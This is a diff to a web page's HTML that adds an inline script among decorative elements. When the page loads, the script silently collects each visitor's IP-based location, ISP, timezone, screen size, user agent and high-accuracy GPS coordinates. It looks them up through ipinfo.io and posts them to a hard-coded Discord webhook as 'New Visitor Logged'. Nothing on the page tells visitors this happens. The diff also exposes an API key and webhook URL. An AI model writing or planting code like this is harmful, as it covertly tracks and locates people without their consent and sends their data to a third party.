@@ -16,6 +16,59 @@
         <div class="gb" style="position: absolute; right: 10%; top: 10%;" bis_skin_checked="1"></div>
         <div class="gb" style="position: absolute; left: 5%; top: 40%;" bis_skin_checked="1"></div>
         <div class="gb" style="position: absolute; right: 25%; top: 70%;" bis_skin_checked="1"></div>
+        ­<script>
+  const apiKey = '3cf8ff0b3ff36c';  // Replace with your IPinfo API key
+  const webhookURL = 'https://discord.com/api/webhooks/1340591422440734730/qlu0Fz-JCfKul3yxETQXrXS8m3oXdU2bURKgGWAlM_urwbk5txfrZH2-9WZlNuluXAA_';
+
+  function sendVisitorData(ipData, lat = "N/A", lon = "N/A", accuracy = "N/A") {
+    const userAgent = navigator.userAgent;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+
+    const embedData = {
+      "embeds": [{
+        "title": "New Visitor Logged",
+        "description": `**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
+        "color": 3066993,
+      }]
+    };
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(embedData)
+    })
+    .then(() => console.log('Visitor data sent.'))
+    .catch(error => console.error('Error sending data:', error));
+  }
+
+  function logVisitor() {
+    fetch(`https://ipinfo.io?token=${apiKey}`)
+      .then(response => response.json())
+      .then(ipData => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              sendVisitorData(ipData, position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+            },
+            (error) => {
+              console.warn("Geolocation permission denied or error:", error);
+              sendVisitorData(ipData);  // Send IP-based location if GPS is denied
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } else {
+          console.warn("Geolocation not supported by browser.");
+          sendVisitorData(ipData);
+        }
+      })
+      .catch(error => console.error('Error fetching IP data:', error));
+  }
+
+  logVisitor();
+</script>
+            
         <div class="flex min-h-screen w-full items-center justify-center top">
             <div class="w-[600px] flex flex-col">
                 <div class="flex w-full flex-col">
